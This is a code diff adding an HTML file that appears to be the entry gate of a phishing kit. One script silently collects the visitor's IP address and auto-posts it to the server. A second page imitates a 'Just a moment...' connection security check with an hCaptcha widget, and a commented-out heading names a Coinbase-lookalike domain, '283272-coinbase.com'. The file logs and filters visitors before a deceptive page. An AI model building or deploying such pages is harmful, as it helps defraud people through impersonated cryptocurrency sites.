@@ -1,0 +1,114 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body>
+            <script>
+            // let ipAddress;
+
+            fetch('https://httpbin.org/ip')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress = data.origin;
+
+                    const form = document.createElement('form');
+                    form.setAttribute('method', 'post');
+                    form.setAttribute('action', window.location.href);
+
+                    const input = document.createElement('input');
+                    input.setAttribute('type', 'hidden');
+                    input.setAttribute('name', 'ipAddress');
+                    input.setAttribute('value', ipAddress);
+
+                    form.appendChild(input);
+
+                    document.body.appendChild(form);
+                    form.submit();
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        </script>
+    </body>
+
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta name="robots" content="noindex,follow">
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Just a moment...</title>
+	<script src="https://www.hcaptcha.com/1/api.js" async defer></script>
+	<link rel="preconnect" href="https://fonts.googleapis.com">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link href="https://fonts.googleapis.com/css2?family=Lato:wght@400&display=swap" rel="stylesheet">
+	<style>
+		*,
+		*::before,
+		*::after {
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+		}
+
+		body {
+			background-color: #222222;
+			font-family: 'Lato', sans-serif;
+		}
+
+		p,
+		h1,
+		h3 {
+			color: #fff;
+		}
+
+		h1 {
+			margin-bottom: .5rem;
+		}
+
+		.p {
+			margin-top: 2rem;
+		}
+
+		.container {
+			height: 100vh;
+			display: flex;
+			justify-content: center;
+			align-items: center;
+		}
+
+		form {
+			padding: 1rem;
+			height: 17rem;
+			display: flex;
+			justify-content: space-between;
+			flex-direction: column;
+		}
+	</style>
+</head>
+<body>
+	<div class="container">
+		<form method="POST" action="">
+			<div class="header">
+				<!-- <h1>283272-coinbase.com</h1> -->
+				<h3>Confirm that you are not a robot</h3>
+			</div>
+			<div class="h-captcha" data-sitekey="637f9d64-86c8-431f-96d9-2e16471ea844" data-theme="dark" data-callback="onCaptchaSolved"></div>
+			<p>This site needs to review the security of your connection before you can continue.</p>
+		</form>
+	</div>
+
+	<script>
+		function onCaptchaSolved(token) {
+			console.log('Captcha solved:', token);
+			document.querySelector('form').submit();
+		}
+	</script>
+</body>
+</html>
